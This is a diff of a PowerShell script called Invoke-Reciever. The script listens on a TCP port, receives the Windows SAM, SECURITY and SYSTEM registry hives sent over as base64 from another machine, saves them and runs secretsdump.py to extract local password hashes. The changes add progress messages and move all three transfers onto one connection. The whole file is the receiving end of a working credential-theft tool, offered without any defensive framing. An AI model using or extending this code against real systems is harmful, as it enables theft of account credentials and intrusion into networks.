@@ -5,36 +5,54 @@ function Invoke-Reciever {
         [int]
         $port = 9000
     )
+    Write-Host
+    Write-Host
+    Write-Host Starting Server
     $endpoint = new-object System.Net.IPEndPoint ([system.net.ipaddress]::any, $port)
     $listener = new-object System.Net.Sockets.TcpListener $endpoint
     $listener.start()
+    Write-Host
     Write-Host Waiting For Connection...
     $client = $listener.AcceptTcpClient()
-    Write-Host Starting Data Processing...
     $stream = $client.GetStream()
+    Write-Host Connected
+    Write-Host
+    Write-Host Starting Data Processing...
+    Write-Host
+    Write-Host Processing SAM
+    Write-Host
     $byte1 = New-Object byte[] 1000000
     $bytes1 = $stream.read($byte1, 0, $byte1.Length)
     $msg1 += [text.encoding]::ASCII.GetString( (1..$bytes1 | ForEach-Object { $byte1[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SAM', [Convert]::FromBase64String($msg1))
     Write-Host Processed SAM
-    $client = $listener.AcceptTcpClient()
-    $stream = $client.GetStream()
+    Write-Host
+    $stream.Write('0',0,1)
+    Write-Host Processing SECURITY
+    Write-Host
     $byte2 = New-Object byte[] 1000000
     $bytes2 = $stream.read($byte2, 0, $byte2.Length)
     $msg2 += [text.encoding]::ASCII.GetString( (1..$bytes2 | ForEach-Object { $byte2[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SECURITY', [Convert]::FromBase64String($msg2))
     Write-Host Processed SECURITY
-    $client = $listener.AcceptTcpClient()
-    $stream = $client.GetStream()
+    Write-Host
+    $stream.Write('0',0,1)
+    Write-Host Processing SYSTEM
+    Write-Host
     $byte3 = New-Object byte[] 50000000
     $bytes3 = $stream.read($byte3, 0, $byte3.Length)
     $msg3 += [text.encoding]::ASCII.GetString( (1..$bytes3 | ForEach-Object { $byte3[$_-1] } ) )
     [IO.File]::WriteAllBytes('.\SYSTEM', [Convert]::FromBase64String($msg3))
     Write-Host Processed SYSTEM
+    Write-Host
     Write-Host Finished Processing
+    Write-Host
+    Write-Host Stopping Server
     $listener.Stop()
     $listener.Server.Dispose()
     Write-Host Dumping Hashes With secretsdump.py
+    Write-Host
+    Write-Host
     .\secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
 }
 Invoke-Reciever
